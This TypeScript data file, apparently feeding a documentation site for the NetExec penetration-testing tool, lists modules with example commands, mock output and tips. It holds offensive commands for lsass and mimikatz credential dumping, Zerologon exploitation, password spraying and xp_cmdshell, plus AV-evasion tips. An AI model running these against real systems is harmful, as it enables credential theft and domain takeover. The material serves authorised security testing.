interface ModuleParameter {
  name: string;
  description: string;
  default?: string;
}

interface ModuleExample {
  description: string;
  command: string;
}

export interface Module {
  name: string;
  protocol: string;
  description: string;
  stability: 'stable' | 'beta' | 'experimental';
  requiredParams?: string[];
  optionalParams?: ModuleParameter[];
  example: string;
  examples?: ModuleExample[];
  output?: string;
  troubleshooting?: string[];
  parameters: {
    name: string;
    description: string;
  }[];
}

export const modules: Module[] = [
  // SMB / Windows Protocol Modules
  {
    name: 'shares',
    protocol: 'smb',
    description: 'The shares module enumerates and analyzes SMB shares on the target system. It detects available shares, permission levels, and can optionally list accessible files.',
    stability: 'stable',
    example: 'netexec smb 192.168.1.0/24 -u Administrator -p \'Password123!\' --shares',
    optionalParams: [
      { name: '--check-access', description: 'Check for read/write access on shares', default: 'True' },
      { name: '--only-readable', description: 'Show only readable shares', default: 'False' },
      { name: '--exclude-shares', description: 'Comma-separated list of shares to exclude', default: '[\'ADMIN$\', \'IPC$\']' }
    ],
    examples: [
      { 
        description: 'Basic share enumeration', 
        command: 'netexec smb 192.168.1.10 -u Administrator -p \'Password123!\' --shares' 
      },
      { 
        description: 'Show only readable shares', 
        command: 'netexec smb 192.168.1.10 -u Administrator -p \'Password123!\' --shares --only-readable' 
      },
      { 
        description: 'Exclude common shares', 
        command: 'netexec smb 192.168.1.10 -u Administrator -p \'Password123!\' --shares --exclude-shares ADMIN$,C$,IPC$' 
      }
    ],
    output: 'SMB         192.168.1.10    445    DC01        [*] Windows Server 2019 (name:DC01) (domain:CORP)\nSMB         192.168.1.10    445    DC01        [+] CORP\\Administrator:Password123! (Pwn3d!)\nSMB         192.168.1.10    445    DC01        [+] Enumerated shares\nSMB         192.168.1.10    445    DC01        Share           Permissions     Remark\nSMB         192.168.1.10    445    DC01        -----           -----------     ------\nSMB         192.168.1.10    445    DC01        ADMIN$          READ,WRITE      Remote Admin\nSMB         192.168.1.10    445    DC01        C$              READ,WRITE      Default share\nSMB         192.168.1.10    445    DC01        IPC$            READ            Remote IPC\nSMB         192.168.1.10    445    DC01        NETLOGON        READ,WRITE      Logon server share\nSMB         192.168.1.10    445    DC01        SYSVOL          READ            Logon server share\nSMB         192.168.1.10    445    DC01        Users           READ            User home directories',
    troubleshooting: [
      'If no shares are displayed, verify your authentication credentials are correct and have appropriate permissions.',
      'Some shares may require specific permissions to access. Try using a domain administrator account if available.',
      'If encountering connection issues, check network connectivity and firewall rules.',
      'For access denied errors on specific shares, this is normal and indicates proper security controls are in place.'
    ],
    parameters: [
      { name: 'check-share-access', description: 'Check share access' },
      { name: 'only-readable', description: 'Show only readable shares' }
    ]
  },
  {
    name: 'lsassy',
    protocol: 'smb',
    description: 'The lsassy module extracts credentials from lsass memory using various techniques. It can run remotely and extract plaintext passwords, NTLM hashes, and Kerberos tickets.',
    stability: 'stable',
    example: 'netexec smb 192.168.1.10 -u Administrator -p \'Password123!\' -M lsassy',
    optionalParams: [
      { name: '--dumpmethod', description: 'Method to use to dump lsass memory', default: 'comsvcs' },
      { name: '--procdump-path', description: 'Path to procdump.exe on disk', default: 'None' },
      { name: '--dumpert-path', description: 'Path to dumpert.exe on disk', default: 'None' }
    ],
    examples: [
      { 
        description: 'Basic lsassy execution', 
        command: 'netexec smb 192.168.1.10 -u Administrator -p \'Password123!\' -M lsassy' 
      },
      { 
        description: 'Use specific dumping method', 
        command: 'netexec smb 192.168.1.10 -u Administrator -p \'Password123!\' -M lsassy --options dumpmethod=nanodump' 
      }
    ],
    output: 'SMB         192.168.1.10    445    DC01        [*] Windows Server 2019 (name:DC01) (domain:CORP)\nSMB         192.168.1.10    445    DC01        [+] CORP\\Administrator:Password123! (Pwn3d!)\nSMB         192.168.1.10    445    DC01        [+] Executing lsassy module...\nSMB         192.168.1.10    445    DC01        [+] Dumping lsass memory using comsvcs method\nSMB         192.168.1.10    445    DC01        [+] Parsing memory dump...\nSMB         192.168.1.10    445    DC01        [+] Credentials:\nSMB         192.168.1.10    445    DC01        Username    Domain    Password/Hash\nSMB         192.168.1.10    445    DC01        ---------   ------    -------------\nSMB         192.168.1.10    445    DC01        Administrator CORP    aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71\nSMB         192.168.1.10    445    DC01        sqlservice   CORP    Summer2022!',
    troubleshooting: [
      'This module requires administrative privileges on the target system.',
      'Some antivirus solutions may detect and block lsass dumping techniques.',
      'If the default method fails, try alternative dumping methods with --options dumpmethod=nanodump.',
      'For Windows Defender bypass, use more stealthy methods like "ppldump" or "nanodump".'
    ],
    parameters: [
      { name: 'dumpmethod', description: 'Method to use (comsvcs, dllinject, nanodump, etc.)' }
    ]
  },
  {
    name: 'spider_plus',
    protocol: 'smb',
    description: 'The spider_plus module crawls accessible SMB shares recursively to identify sensitive files based on name patterns, content matching, and other criteria.',
    stability: 'beta',
    example: 'netexec smb 192.168.1.10 -u Administrator -p \'Password123!\' -M spider_plus --shares \'C$\' --pattern password',
    optionalParams: [
      { name: '--shares', description: 'Comma-separated list of shares to spider', default: 'None' },
      { name: '--pattern', description: 'Pattern to search for in filenames', default: 'None' },
      { name: '--content', description: 'Search for content within files', default: 'False' },
      { name: '--depth', description: 'Maximum spider recursion depth', default: '10' },
      { name: '--max-size', description: 'Maximum file size to analyze (in bytes)', default: '10000000' }
    ],
    examples: [
      { 
        description: 'Spider C$ for files containing "password" in filename', 
        command: 'netexec smb 192.168.1.10 -u Administrator -p \'Password123!\' -M spider_plus --shares \'C$\' --pattern password' 
      },
      { 
        description: 'Search file content for credentials', 
        command: 'netexec smb 192.168.1.10 -u Administrator -p \'Password123!\' -M spider_plus --shares \'SYSVOL\' --content --pattern \'password|pwd|credential\'' 
      }
    ],
    output: 'SMB         192.168.1.10    445    DC01        [*] Windows Server 2019 (name:DC01) (domain:CORP)\nSMB         192.168.1.10    445    DC01        [+] CORP\\Administrator:Password123! (Pwn3d!)\nSMB         192.168.1.10    445    DC01        [+] Starting spider_plus module on share C$\nSMB         192.168.1.10    445    DC01        [+] Spider depth: 10\nSMB         192.168.1.10    445    DC01        [+] Pattern matches will be shown below:\nSMB         192.168.1.10    445    DC01        C$\\Users\\Administrator\\Documents\\passwords.txt\nSMB         192.168.1.10    445    DC01        C$\\Users\\Public\\password_policy.docx\nSMB         192.168.1.10    445    DC01        C$\\ProgramData\\password_backup.xml',
    troubleshooting: [
      'For large file systems, this module can take a long time to run. Consider increasing max-size for better performance.',
      'If experiencing timeouts, try spidering specific shares or directories instead of entire drives.',
      'For content searching, be aware that binary files might cause false positives.',
      'To avoid detection, limit depth and max-size parameters to reduce network traffic.'
    ],
    parameters: [
      { name: 'shares', description: 'Shares to spider' },
      { name: 'pattern', description: 'Pattern to search for' },
      { name: 'content', description: 'Search file contents' }
    ]
  },
  {
    name: 'mimikatz',
    protocol: 'smb',
    description: 'The mimikatz module executes various mimikatz commands remotely on the target system. It can extract plaintext passwords, hashes, tickets and perform other credential theft operations.',
    stability: 'beta',
    example: 'netexec smb 192.168.1.10 -u Administrator -p \'Password123!\' -M mimikatz -o COMMAND=\'sekurlsa::logonpasswords\'',
    optionalParams: [
      { name: '--command', description: 'Mimikatz command to execute', default: '\'sekurlsa::logonpasswords\'' },
      { name: '--obfuscate', description: 'Obfuscate mimikatz execution to avoid detection', default: 'False' },
      { name: '--cleanup', description: 'Remove mimikatz from disk after execution', default: 'True' }
    ],
    examples: [
      { 
        description: 'Extract logon passwords', 
        command: 'netexec smb 192.168.1.10 -u Administrator -p \'Password123!\' -M mimikatz -o COMMAND=\'sekurlsa::logonpasswords\'' 
      },
      { 
        description: 'Dump SAM database', 
        command: 'netexec smb 192.168.1.10 -u Administrator -p \'Password123!\' -M mimikatz -o COMMAND=\'lsadump::sam\'' 
      },
      { 
        description: 'Extract Kerberos tickets', 
        command: 'netexec smb 192.168.1.10 -u Administrator -p \'Password123!\' -M mimikatz -o COMMAND=\'sekurlsa::tickets /export\'' 
      }
    ],
    output: 'SMB         192.168.1.10    445    DC01        [*] Windows Server 2019 (name:DC01) (domain:CORP)\nSMB         192.168.1.10    445    DC01        [+] CORP\\Administrator:Password123! (Pwn3d!)\nSMB         192.168.1.10    445    DC01        [+] Executing mimikatz module...\nSMB         192.168.1.10    445    DC01        [+] Uploading mimikatz...\nSMB         192.168.1.10    445    DC01        [+] Executing sekurlsa::logonpasswords...\nSMB         192.168.1.10    445    DC01        [+] Found 3 credential entries\nSMB         192.168.1.10    445    DC01        Username: Administrator\nSMB         192.168.1.10    445    DC01        Domain: CORP\nSMB         192.168.1.10    445    DC01        NTLM: 58a478135a93ac3bf058a5ea0e8fdb71\nSMB         192.168.1.10    445    DC01        Username: sqlservice\nSMB         192.168.1.10    445    DC01        Domain: CORP\nSMB         192.168.1.10    445    DC01        Password: Summer2022!\nSMB         192.168.1.10    445    DC01        Username: john.doe\nSMB         192.168.1.10    445    DC01        Domain: CORP\nSMB         192.168.1.10    445    DC01        Password: P@ssw0rd123!',
    troubleshooting: [
      'This module requires administrative privileges on the target system.',
      'Modern Windows systems with advanced security features may block mimikatz execution.',
      'Try using the --obfuscate option if antivirus is blocking execution.',
      'For newer Windows versions, ensure mimikatz is up to date to bypass security controls.'
    ],
    parameters: [
      { name: 'command', description: 'Mimikatz command to execute' },
      { name: 'obfuscate', description: 'Obfuscate execution to evade detection' }
    ]
  },
  {
    name: 'user_hunter',
    protocol: 'ldap',
    description: 'The user_hunter module searches for users in Active Directory based on various criteria such as group membership, properties, and logon workstations.',
    stability: 'stable',
    example: 'netexec ldap 192.168.1.10 -u Administrator -p \'Password123!\' -M user_hunter -o USER="admin*"',
    optionalParams: [
      { name: '--user', description: 'Username pattern to search for', default: 'None' },
      { name: '--group', description: 'Group to search users in', default: 'None' },
      { name: '--admin-count', description: 'Show only admin accounts', default: 'False' },
      { name: '--allowed-to-delegate', description: 'Show only users that can be delegated', default: 'False' }
    ],
    examples: [
      { 
        description: 'Find users with "admin" in username', 
        command: 'netexec ldap 192.168.1.10 -u Administrator -p \'Password123!\' -M user_hunter -o USER="admin*"' 
      },
      { 
        description: 'Find all Domain Admins', 
        command: 'netexec ldap 192.168.1.10 -u Administrator -p \'Password123!\' -M user_hunter -o GROUP="Domain Admins"' 
      }
    ],
    output: 'LDAP        192.168.1.10    389    DC01        [*] Windows Server 2019 (name:DC01) (domain:CORP)\nLDAP        192.168.1.10    389    DC01        [+] CORP\\Administrator:Password123! (Pwn3d!)\nLDAP        192.168.1.10    389    DC01        [+] Executing user_hunter module...\nLDAP        192.168.1.10    389    DC01        [+] Searching for users matching pattern: admin*\nLDAP        192.168.1.10    389    DC01        [+] Found 3 users:\nLDAP        192.168.1.10    389    DC01        Username          AdminCount     LastLogon                \nLDAP        192.168.1.10    389    DC01        --------          ----------     ---------                \nLDAP        192.168.1.10    389    DC01        Administrator     True           2022-10-15 14:32:10 UTC  \nLDAP        192.168.1.10    389    DC01        admin.service     True           2022-10-14 09:15:22 UTC  \nLDAP        192.168.1.10    389    DC01        adminassistant    False          2022-09-30 17:45:33 UTC  ',
    troubleshooting: [
      'To get the most information, use a Domain Admin account or an account with extensive directory read permissions.',
      'For large Active Directory environments, searches may take some time.',
      'Wildcards (*) can be used in user and group parameters.',
      'Combine multiple parameters to narrow down your search results.'
    ],
    parameters: [
      { name: 'user', description: 'Username pattern to search for' },
      { name: 'group', description: 'Group to search users in' }
    ]
  },
  {
    name: 'mssql_query',
    protocol: 'mssql',
    description: 'The mssql_query module allows execution of SQL queries on Microsoft SQL Server instances. It can be used to extract database information or execute commands with proper privileges.',
    stability: 'stable',
    example: 'netexec mssql 192.168.1.10 -u sa -p \'SqlPassword123!\' -M mssql_query -o QUERY="SELECT name FROM master..sysdatabases"',
    optionalParams: [
      { name: '--query', description: 'SQL query to execute', default: 'None' },
      { name: '--file', description: 'File containing SQL queries', default: 'None' },
      { name: '--no-header', description: 'Do not display column headers', default: 'False' }
    ],
    examples: [
      { 
        description: 'List all databases', 
        command: 'netexec mssql 192.168.1.10 -u sa -p \'SqlPassword123!\' -M mssql_query -o QUERY="SELECT name FROM master..sysdatabases"' 
      },
      { 
        description: 'Execute system commands via xp_cmdshell', 
        command: 'netexec mssql 192.168.1.10 -u sa -p \'SqlPassword123!\' -M mssql_query -o QUERY="EXEC xp_cmdshell \'whoami\'"' 
      }
    ],
    output: 'MSSQL       192.168.1.10    1433   DB01        [*] Windows Server 2019 (name:DB01) (domain:CORP)\nMSSQL       192.168.1.10    1433   DB01        [+] sa:SqlPassword123! (Pwn3d!)\nMSSQL       192.168.1.10    1433   DB01        [+] Executing mssql_query module...\nMSSQL       192.168.1.10    1433   DB01        [+] Executing query: SELECT name FROM master..sysdatabases\nMSSQL       192.168.1.10    1433   DB01        [+] Results:\nMSSQL       192.168.1.10    1433   DB01        name\nMSSQL       192.168.1.10    1433   DB01        ------------\nMSSQL       192.168.1.10    1433   DB01        master\nMSSQL       192.168.1.10    1433   DB01        tempdb\nMSSQL       192.168.1.10    1433   DB01        model\nMSSQL       192.168.1.10    1433   DB01        msdb\nMSSQL       192.168.1.10    1433   DB01        CustomerDB',
    troubleshooting: [
      'For executing system commands, ensure xp_cmdshell is enabled on the SQL Server.',
      'If receiving permissions errors, verify that your SQL account has sufficient privileges.',
      'Complex queries with multiple statements may need to be placed in a file and executed with --file.',
      'For large result sets, consider adding a TOP clause to limit results.'
    ],
    parameters: [
      { name: 'query', description: 'SQL query to execute' },
      { name: 'file', description: 'File containing SQL queries' }
    ]
  },
  {
    name: 'winrm_exec',
    protocol: 'winrm',
    description: 'The winrm_exec module executes commands on remote Windows systems via Windows Remote Management (WinRM). It provides a simple way to run PowerShell or CMD commands.',
    stability: 'stable',
    example: 'netexec winrm 192.168.1.10 -u Administrator -p \'Password123!\' -X "whoami /all"',
    optionalParams: [
      { name: '--powershell', description: 'Execute the command using PowerShell', default: 'False' },
      { name: '--no-output', description: 'Do not display command output', default: 'False' },
      { name: '--timeout', description: 'Command execution timeout in seconds', default: '30' }
    ],
    examples: [
      { 
        description: 'Execute a command with CMD', 
        command: 'netexec winrm 192.168.1.10 -u Administrator -p \'Password123!\' -X "whoami /all"' 
      },
      { 
        description: 'Execute PowerShell command', 
        command: 'netexec winrm 192.168.1.10 -u Administrator -p \'Password123!\' -X "Get-Process" --powershell' 
      }
    ],
    output: 'WINRM       192.168.1.10    5985   WS01        [*] Windows 10 Enterprise (name:WS01) (domain:CORP)\nWINRM       192.168.1.10    5985   WS01        [+] CORP\\Administrator:Password123! (Pwn3d!)\nWINRM       192.168.1.10    5985   WS01        [+] Executing command: whoami /all\nWINRM       192.168.1.10    5985   WS01        [+] Output:\nWINRM       192.168.1.10    5985   WS01        USER INFORMATION\nWINRM       192.168.1.10    5985   WS01        ----------------\nWINRM       192.168.1.10    5985   WS01        User Name      SID\nWINRM       192.168.1.10    5985   WS01        ============== ==============================================\nWINRM       192.168.1.10    5985   WS01        corp\\administrator S-1-5-21-1473733912-1059243552-3491339771-500\nWINRM       192.168.1.10    5985   WS01        \nWINRM       192.168.1.10    5985   WS01        GROUP INFORMATION\nWINRM       192.168.1.10    5985   WS01        -----------------\nWINRM       192.168.1.10    5985   WS01        \nWINRM       192.168.1.10    5985   WS01        Group Name                             Type             SID          Attributes\nWINRM       192.168.1.10    5985   WS01        ====================================== ================ ============ ====================\nWINRM       192.168.1.10    5985   WS01        Mandatory Label\\High Mandatory Level   Label            S-1-16-12288',
    troubleshooting: [
      'WinRM needs to be enabled on the target system. By default, it is not enabled on workstations.',
      'If authentication fails, ensure the user has WinRM access permissions.',
      'For complex PowerShell commands, consider escaping quotes properly or placing commands in a file.',
      'If command execution times out, increase the timeout value with --timeout option.'
    ],
    parameters: [
      { name: 'powershell', description: 'Execute command with PowerShell' },
      { name: 'no-output', description: 'Hide command output' }
    ]
  },
  {
    name: 'ssh_login',
    protocol: 'ssh',
    description: 'The ssh_login module attempts to authenticate to SSH servers using provided credentials. It can be used for password spraying or targeted authentication attempts.',
    stability: 'stable',
    example: 'netexec ssh 192.168.1.0/24 -u root -p \'toor\'',
    optionalParams: [
      { name: '--key-file', description: 'SSH private key file', default: 'None' },
      { name: '--no-bruteforce', description: 'Stop on first valid authentication', default: 'False' },
      { name: '--timeout', description: 'SSH connection timeout', default: '5' }
    ],
    examples: [
      { 
        description: 'Try to login with password', 
        command: 'netexec ssh 192.168.1.0/24 -u root -p \'toor\'' 
      },
      { 
        description: 'Login with SSH key', 
        command: 'netexec ssh 192.168.1.10 -u admin --key-file private_key.pem' 
      }
    ],
    output: 'SSH         192.168.1.10    22     LINUX01     [*] Ubuntu 20.04 (name:LINUX01)\nSSH         192.168.1.10    22     LINUX01     [+] root:toor (Pwn3d!)\nSSH         192.168.1.15    22     LINUX02     [*] CentOS 8 (name:LINUX02)\nSSH         192.168.1.15    22     LINUX02     [-] root:toor (Authentication failed)',
    troubleshooting: [
      'If connection is refused, ensure SSH service is running on the target port.',
      'For key-based authentication, verify key file permissions (should be 600).',
      'Some SSH servers may have rate limiting or brute force protection.',
      'For script-based SSH interaction, consider using the --exec option instead.'
    ],
    parameters: [
      { name: 'key-file', description: 'SSH private key file' }
    ]
  },
  
  // WinRM Protocol Modules
  {
    name: 'ps_exec',
    protocol: 'winrm',
    description: 'The ps_exec module allows execution of arbitrary PowerShell commands on target Windows systems using WinRM protocol, providing a secure and authorized method for remote command execution.',
    stability: 'stable',
    example: 'netexec winrm 192.168.1.10 -u Administrator -p \'Password123!\' -M ps_exec -o COMMAND="Get-Service | Where-Object {$_.Status -eq \'Running\'}"',
    optionalParams: [
      { name: '--command', description: 'PowerShell command to execute', default: 'None' },
      { name: '--script-file', description: 'Local path to PowerShell script file to execute', default: 'None' },
      { name: '--encode', description: 'Base64 encode the command for obfuscation', default: 'False' }
    ],
    examples: [
      { 
        description: 'Execute basic PowerShell command', 
        command: 'netexec winrm 192.168.1.10 -u Administrator -p \'Password123!\' -M ps_exec -o COMMAND="Get-Process | Sort-Object -Property CPU -Descending | Select-Object -First 5"' 
      },
      { 
        description: 'Run PowerShell script file', 
        command: 'netexec winrm 192.168.1.10 -u Administrator -p \'Password123!\' -M ps_exec -o SCRIPT_FILE="/path/to/script.ps1"' 
      },
      { 
        description: 'Execute encoded command for obfuscation', 
        command: 'netexec winrm 192.168.1.10 -u Administrator -p \'Password123!\' -M ps_exec -o COMMAND="Get-Service" ENCODE=True' 
      }
    ],
    output: 'WINRM       192.168.1.10    5985   WIN-DC01     [*] Windows 10 or Windows Server 2019 (name:WIN-DC01) (domain:CORP)\nWINRM       192.168.1.10    5985   WIN-DC01     [+] CORP\\Administrator:Password123! (Pwn3d!)\nWINRM       192.168.1.10    5985   WIN-DC01     [+] Executing ps_exec module...\nWINRM       192.168.1.10    5985   WIN-DC01     [+] Command output:\nWINRM       192.168.1.10    5985   WIN-DC01     \nWINRM       192.168.1.10    5985   WIN-DC01     Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName\nWINRM       192.168.1.10    5985   WIN-DC01     -------  ------    -----      -----     ------     --  -- -----------\nWINRM       192.168.1.10    5985   WIN-DC01         654      45   158956     166060     289.00   4328   1 chrome\nWINRM       192.168.1.10    5985   WIN-DC01        1103      67   126644     184992     243.52   3270   1 explorer\nWINRM       192.168.1.10    5985   WIN-DC01         543      40    78644      88228     142.30   7560   1 MsMpEng\nWINRM       192.168.1.10    5985   WIN-DC01         234      28    42556      52308      56.25   6532   1 svchost\nWINRM       192.168.1.10    5985   WIN-DC01         678      33    34564      24588      45.77   2124   0 lsass',
    troubleshooting: [
      'WinRM service must be running on the target and properly configured (quickconfig).',
      'Ensure the account used has proper permissions to execute PowerShell remotely.',
      'For complex commands with special characters, consider using script-file option instead.',
      'If execution policy restrictions are encountered, add "Set-ExecutionPolicy Bypass -Scope Process -Force" at beginning of script.'
    ],
    parameters: [
      { name: 'command', description: 'PowerShell command to execute' },
      { name: 'script-file', description: 'Local path to PowerShell script file' },
      { name: 'encode', description: 'Base64 encode the command for obfuscation' }
    ]
  },
  {
    name: 'event_hunter',
    protocol: 'winrm',
    description: 'The event_hunter module searches Windows Event Logs for interesting security events such as logon failures, privilege escalations, and potential security breaches.',
    stability: 'beta',
    example: 'netexec winrm 192.168.1.10 -u Administrator -p \'Password123!\' -M event_hunter -o LOG="Security" DAYS=1 PATTERN="4625|4720|4724"',
    optionalParams: [
      { name: '--log', description: 'Event log to search (Security, System, Application)', default: 'Security' },
      { name: '--days', description: 'Number of days of logs to search', default: '1' },
      { name: '--pattern', description: 'Event IDs to search for (comma or pipe separated)', default: '4624,4625,4720' },
      { name: '--export', description: 'Export results to CSV file', default: 'False' }
    ],
    examples: [
      { 
        description: 'Search for failed login attempts (4625) in last 24 hours', 
        command: 'netexec winrm 192.168.1.10 -u Administrator -p \'Password123!\' -M event_hunter -o LOG="Security" DAYS=1 PATTERN="4625"' 
      },
      { 
        description: 'Search for account modifications and exports to CSV', 
        command: 'netexec winrm 192.168.1.10 -u Administrator -p \'Password123!\' -M event_hunter -o LOG="Security" PATTERN="4720,4724,4738" EXPORT=True' 
      }
    ],
    output: 'WINRM       192.168.1.10    5985   WIN-DC01     [*] Windows 10 or Windows Server 2019 (name:WIN-DC01) (domain:CORP)\nWINRM       192.168.1.10    5985   WIN-DC01     [+] CORP\\Administrator:Password123! (Pwn3d!)\nWINRM       192.168.1.10    5985   WIN-DC01     [+] Executing event_hunter module...\nWINRM       192.168.1.10    5985   WIN-DC01     [+] Searching Security logs from past 1 days for events: 4625\nWINRM       192.168.1.10    5985   WIN-DC01     [+] Found 5 matching events:\nWINRM       192.168.1.10    5985   WIN-DC01     EventID    Time                 Computer     User           Description\nWINRM       192.168.1.10    5985   WIN-DC01     -------    ----                 --------     ----           -----------\nWINRM       192.168.1.10    5985   WIN-DC01     4625       2023-02-10 14:35:22  WIN-DC01     jsmith        Logon failure - Bad password\nWINRM       192.168.1.10    5985   WIN-DC01     4625       2023-02-10 14:35:45  WIN-DC01     jsmith        Logon failure - Bad password\nWINRM       192.168.1.10    5985   WIN-DC01     4625       2023-02-10 15:22:18  WIN-DC01     admin         Logon failure - Unknown username\nWINRM       192.168.1.10    5985   WIN-DC01     4625       2023-02-10 16:45:03  WIN-DC01     Administrator Logon failure - Account locked\nWINRM       192.168.1.10    5985   WIN-DC01     4625       2023-02-10 17:12:57  WIN-DC01     svc_account   Logon failure - Account disabled',
    troubleshooting: [
      'This module requires administrative privileges to read security event logs.',
      'For domain controllers with extensive logs, narrow down search criteria to avoid timeout.',
      'Some events may be missing if logs have been rotated or cleared.',
      'For large date ranges, consider using the export option and process offline.'
    ],
    parameters: [
      { name: 'log', description: 'Event log to search' },
      { name: 'days', description: 'Number of days of logs to search' },
      { name: 'pattern', description: 'Event IDs to search for' }
    ]
  },
  
  // SMB Additional Modules
  {
    name: 'gpp_password',
    protocol: 'smb',
    description: 'The gpp_password module searches SYSVOL for Group Policy Preference files that contain encrypted passwords, which can be easily decrypted due to the published AES key.',
    stability: 'stable',
    example: 'netexec smb 192.168.1.10 -u Administrator -p \'Password123!\' -M gpp_password',
    optionalParams: [
      { name: '--download', description: 'Download found files to local directory', default: 'False' }
    ],
    examples: [
      { 
        description: 'Search for GPP passwords', 
        command: 'netexec smb 192.168.1.10 -u Administrator -p \'Password123!\' -M gpp_password' 
      },
      { 
        description: 'Search and download found files', 
        command: 'netexec smb 192.168.1.10 -u Administrator -p \'Password123!\' -M gpp_password -o DOWNLOAD=True' 
      }
    ],
    output: 'SMB         192.168.1.10    445    DC01        [*] Windows Server 2019 (name:DC01) (domain:CORP)\nSMB         192.168.1.10    445    DC01        [+] CORP\\Administrator:Password123! (Pwn3d!)\nSMB         192.168.1.10    445    DC01        [+] Executing gpp_password module...\nSMB         192.168.1.10    445    DC01        [+] Found GPP in: \\\\DC01\\SYSVOL\\CORP.LOCAL\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\Machine\\Preferences\\Groups\\Groups.xml\nSMB         192.168.1.10    445    DC01        [+] Decrypted password: SuperS3cr3t!\nSMB         192.168.1.10    445    DC01        Username: backup_svc\nSMB         192.168.1.10    445    DC01        Password: SuperS3cr3t!\nSMB         192.168.1.10    445    DC01        Changed: 2022-09-15\nSMB         192.168.1.10    445    DC01        [+] Found GPP in: \\\\DC01\\SYSVOL\\CORP.LOCAL\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\Machine\\Preferences\\Services\\Services.xml\nSMB         192.168.1.10    445    DC01        [+] Decrypted password: ServicePwd123\nSMB         192.168.1.10    445    DC01        Service: SQL Backup Service\nSMB         192.168.1.10    445    DC01        Username: CORP\\sqlbackup\nSMB         192.168.1.10    445    DC01        Password: ServicePwd123\nSMB         192.168.1.10    445    DC01        Changed: 2022-10-20',
    troubleshooting: [
      'This vulnerability applies only to older Group Policy Preferences created before MS14-025 patch.',
      'Access to SYSVOL share is required, which is typically available to all authenticated domain users.',
      'Modern domains may not have this vulnerability, as Microsoft patched it in 2014.',
      'Review downloaded XML files to verify the extracted credentials are still valid.'
    ],
    parameters: [
      { name: 'download', description: 'Download found files' }
    ]
  },
  {
    name: 'zerologon',
    protocol: 'smb',
    description: 'The zerologon module exploits the CVE-2020-1472 vulnerability in Windows Netlogon Remote Protocol, allowing an attacker to reset the computer account password of a domain controller, potentially leading to domain compromise.',
    stability: 'experimental',
    example: 'netexec smb 192.168.1.10 -u \'\'  -p \'\' -M zerologon',
    optionalParams: [
      { name: '--check', description: 'Only check if target is vulnerable', default: 'True' },
      { name: '--exploit', description: 'Attempt to exploit the vulnerability', default: 'False' },
      { name: '--restore', description: 'Restore the computer account password from backup file', default: 'False' }
    ],
    examples: [
      { 
        description: 'Check if target is vulnerable', 
        command: 'netexec smb 192.168.1.10 -u \'\' -p \'\' -M zerologon' 
      },
      { 
        description: 'Exploit the vulnerability (CAUTION!)', 
        command: 'netexec smb 192.168.1.10 -u \'\' -p \'\' -M zerologon -o EXPLOIT=True' 
      },
      { 
        description: 'Restore DC password from backup', 
        command: 'netexec smb 192.168.1.10 -u Administrator -p \'Password123!\' -M zerologon -o RESTORE=True' 
      }
    ],
    output: 'SMB         192.168.1.10    445    DC01        [*] Windows Server 2016 (name:DC01) (domain:CORP)\nSMB         192.168.1.10    445    DC01        [+] Checking for Zerologon vulnerability (CVE-2020-1472)\nSMB         192.168.1.10    445    DC01        [!] Target DC01$ is VULNERABLE to Zerologon attack!\nSMB         192.168.1.10    445    DC01        [+] Use EXPLOIT=True option to reset the DC\'s account password',
    troubleshooting: [
      'This module requires direct access to the domain controller on port 445.',
      'Modern systems with security updates installed are not vulnerable.',
      'If exploitation is attempted, create a backup of the machine account password to restore it later.',
      'Exploiting without restoring the password will break domain functionality and require manual recovery.'
    ],
    parameters: [
      { name: 'check', description: 'Only check if target is vulnerable' },
      { name: 'exploit', description: 'Attempt to exploit the vulnerability' },
      { name: 'restore', description: 'Restore the computer account password' }
    ]
  },
  
  // LDAP Additional Modules
  {
    name: 'bloodhound',
    protocol: 'ldap',
    description: 'The bloodhound module collects Active Directory data for analysis with the BloodHound tool. It gathers information about users, groups, computers, sessions, and ACLs to identify potential attack paths.',
    stability: 'stable',
    example: 'netexec ldap 192.168.1.10 -u Administrator -p \'Password123!\' -M bloodhound -o COLLECTION_METHOD=Default ZIP_FILENAME=corp-ad-data.zip',
    optionalParams: [
      { name: '--collection-method', description: 'Data collection method (Default, DCOnly, SessionLoop, LoggedOn, All)', default: 'Default' },
      { name: '--zip-filename', description: 'Filename for the archive to store collected data', default: 'bloodhound_<randomstring>.zip' },
      { name: '--dns-resolver', description: 'Custom DNS resolver to use', default: 'System Default' }
    ],
    examples: [
      { 
        description: 'Basic Bloodhound collection', 
        command: 'netexec ldap 192.168.1.10 -u Administrator -p \'Password123!\' -M bloodhound' 
      },
      { 
        description: 'Complete data collection', 
        command: 'netexec ldap 192.168.1.10 -u Administrator -p \'Password123!\' -M bloodhound -o COLLECTION_METHOD=All ZIP_FILENAME=complete-ad-map.zip' 
      },
      { 
        description: 'Focused collection of domain controllers', 
        command: 'netexec ldap 192.168.1.10 -u Administrator -p \'Password123!\' -M bloodhound -o COLLECTION_METHOD=DCOnly' 
      }
    ],
    output: 'LDAP        192.168.1.10    389    DC01        [*] Windows Server 2019 (name:DC01) (domain:CORP)\nLDAP        192.168.1.10    389    DC01        [+] CORP\\Administrator:Password123! (Pwn3d!)\nLDAP        192.168.1.10    389    DC01        [+] Executing bloodhound module...\nLDAP        192.168.1.10    389    DC01        [+] Collection method: Default\nLDAP        192.168.1.10    389    DC01        [+] Resolving domain trust relationships\nLDAP        192.168.1.10    389    DC01        [+] Found 1 domains\nLDAP        192.168.1.10    389    DC01        [+] Collecting domain users\nLDAP        192.168.1.10    389    DC01        [+] Found 154 users\nLDAP        192.168.1.10    389    DC01        [+] Collecting domain groups\nLDAP        192.168.1.10    389    DC01        [+] Found 52 groups\nLDAP        192.168.1.10    389    DC01        [+] Collecting domain computers\nLDAP        192.168.1.10    389    DC01        [+] Found 35 computers\nLDAP        192.168.1.10    389    DC01        [+] Collecting group memberships\nLDAP        192.168.1.10    389    DC01        [+] Processing ACLs\nLDAP        192.168.1.10    389    DC01        [+] Output written to: bloodhound_20230210142556.zip',
    troubleshooting: [
      'For large Active Directory environments, collection can take a considerable amount of time.',
      'Some collection methods may trigger security alerts or generate significant network traffic.',
      'Using domain admin credentials provides the most complete view of the environment.',
      'If errors occur, try different collection methods or specify custom DNS resolver.'
    ],
    parameters: [
      { name: 'collection-method', description: 'Data collection method' },
      { name: 'zip-filename', description: 'Filename for the output archive' }
    ]
  },
  {
    name: 'kerberoasting',
    protocol: 'ldap',
